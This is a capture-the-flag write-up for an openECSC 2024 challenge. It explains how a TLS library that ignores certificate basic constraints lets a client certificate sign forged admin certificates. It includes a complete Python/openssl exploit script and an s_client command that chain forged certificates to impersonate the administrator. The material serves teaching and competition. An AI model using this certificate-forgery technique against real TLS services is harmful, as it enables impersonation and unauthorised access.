# openECSC 2024 - Round 1

## [misc] Flags distribution Inc. (17 solves)

Finally Flags distribution Inc. made a false step! They accidentally exposed their client certificate signing endpoint to the internet... It doesn't seem to be able to sign admin certificates though...

This is a remote challenge, you can connect with:

`openssl s_client -connect flagsdistribution.challs.open.ecsc2024.it:38000`

`nc flagsdistribution.challs.open.ecsc2024.it 38001`

Author: Alberto Carboneri <@Alberto247>

## Overview

In this challenge we are given an application which makes use of [TLSe](https://github.com/eduardsui/tlse), a single-file TLS implementation written in C.
The challenge consists of a simple C program making use of such library to expose a service wrapped with TLS. 
It makes use of client certificates to authenticate the connecting users, providing the flag only to the user `FlagsDistributionAdministrator`, if its certificate has been issued by `Flags distribution Inc.`.

Another endpoint, available as a separate service, provides user certificates for any user, except `FlagsDistributionAdministrator`.

A custom root certificate is used in the whole challenge as a root of trust for every certificate chain.

The challenge patches TLSe during build. However, as noted in the Dockerfile, this patch is a bug fix for tlse and is not intended to introduce any vulnerability.

## Certificate chains and certificate basic constraints

In the wild, using the root certificate to sign every other certificate would be both cumbersome and a security issue, so certificate chains are commonly used. A certificate can be signed by the root certificate, and that certificate can be then used to sign other certificates. During the verification the whole certificate chain is verified, and if it leads to a trusted root certificate it is considered valid. This allows for a tree of certificates to be generated, all leading to a common root.

However, not all certificates should be used for every scope and there should be a way to limit the capabilities of a specific certificate, otherwhise signing any certificate would be almost equivalent to giving away your root certificate (apart from the possibility of certificate revocation of course). To achieve that, the basic constraints section was introduced, describing the scope of the current certificate. For example, the field `CA` specifies whether the certificate is supposed to be used to sign other certificates and be in any place other than the end of the signature chain. This is generally set to `false` in client certificates, as those are meant to be used for authentication, and not as a CA.

## The bug

While the basic constraints section of a certificate limits its scopes, nothing prevents their use outside of those limits. It is up to the chain verification code to limit their use and reject invalid chains.
The challenge doesn't properly check this section and this poses a security risk. In fact an attacker can use a client certificate as a certification authority and use it to sign other certificates. 
The intended solution for the challenge was to request a certificate from the signing endpoint and use that to sign other certificates. Since the server was also verifying the issuer, the solution requires using the provided certificate to sign a new certificate having the correct issuer, and then use that certificate to sign a final certificate having the correct user.
Finally, one should package all three certificates into a chain, and provide such chain to the server.
This challenge was heavily inspired by a bug present in the TLS library of the Nintendo DS. You can find more information [here](https://github.com/KaeruTeam/nds-constraint).


## Openssl interface

Many players had trouble using the openssl client to communicate with the remote server.
Unfortunately, this client appears to have a not-so-clear error handling, providing confusing or wrong information on the reason of the failure.
The proper way to solve this challenge using such client was to:
1. Use the IP instead of the domain when connecting to the remote server, as using the domain causes error when validating the server certificate
2. Configure the client to use tls1.2 as tls1.3 is not supported by the server. This is achieved by pasing the "-tls1_2" parameter
3. Split the obtained chain to have a single certificate, called `fakeadmin_cert.pem` in this example, containing the outer certificate, and a file, called `chain.pem` in this example, containing the two certificates composing the rest of the chain
4. Connect to the server using the following command line `openssl s_client -cert fakeadmin_cert.pem -key key.pem -cert_chain chain.pem -connect 128.140.101.143:38000 -tls1_2`

Another, simpler solution, was to use pwntools, providing the correct ssl context. This is shown in the exploit below.

## Exploit

```python
#!/usr/bin/env python3

import ssl
import subprocess as sp

from pwn import *

logging.disable()

HOST = "flagsdistribution.challs.open.ecsc2024.it"
PORT = 38000

username = "".join([random.choice(string.ascii_letters) for _ in range(16)])

with remote(HOST, PORT + 1) as r:
    r.recvuntil(b"name: ")
    r.sendline(username.encode())
    r.recvuntil(b"Here is your certificate:")
    certificate = r.recvuntil(b"-----END CERTIFICATE-----").decode().strip()
    r.recvuntil(b"Here is your certificate key:")
    key = r.recvuntil(b"-----END PRIVATE KEY-----").decode().strip()

user_cert = tempfile.mktemp()
with open(user_cert, "w") as f:
    f.write(certificate)

user_cert_key = tempfile.mktemp()
with open(user_cert_key, "w") as f:
    f.write(key)

fakeadmin_key = tempfile.mktemp()
fakeadmin_csr = tempfile.mktemp()
fakeadmin_pem = tempfile.mktemp()

sp.check_call(["openssl", "genrsa", "-out", fakeadmin_key, "2048"], stdout=sp.PIPE)

sp.check_call(["openssl", "req", "-new", "-out", fakeadmin_csr, "-key", fakeadmin_key, "-subj",
               f"/C=IT/CN=FlagsDistributionAdministrator/O=Flags distribution Inc."], stdout=sp.PIPE)

sp.check_call(
    ["openssl", "x509", "-req", "-in", fakeadmin_csr, "-CA", user_cert, "-CAkey", user_cert_key, "-out", fakeadmin_pem,
     "-CAcreateserial", "-days", "365", "-sha256"], stdout=sp.PIPE)

fakeadmin_outer_key = tempfile.mktemp()
fakeadmin_outer_csr = tempfile.mktemp()
fakeadmin_outer_pem = tempfile.mktemp()

sp.check_call(["openssl", "genrsa", "-out", fakeadmin_outer_key, "2048"], stdout=sp.PIPE)

sp.check_call(["openssl", "req", "-new", "-out", fakeadmin_outer_csr, "-key", fakeadmin_outer_key, "-subj",
               f"/C=IT/CN=FlagsDistributionAdministrator/O=Flags distribution Inc."], stdout=sp.PIPE)

sp.check_call(
    ["openssl", "x509", "-req", "-in", fakeadmin_outer_csr, "-CA", fakeadmin_pem, "-CAkey", fakeadmin_key, "-out",
     fakeadmin_outer_pem, "-CAcreateserial", "-days", "365", "-sha256"], stdout=sp.PIPE)

fakeadmin_chain = tempfile.mktemp()
os.system(f"cat {fakeadmin_outer_pem} {fakeadmin_pem} {user_cert} > {fakeadmin_chain}")

context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.load_cert_chain(fakeadmin_chain, fakeadmin_outer_key)

with remote(socket.gethostbyname(HOST), PORT, ssl=True, ssl_context=context) as r:
    flag = r.recvline().decode().split("system is ")[-1].strip()
    print(flag)
```
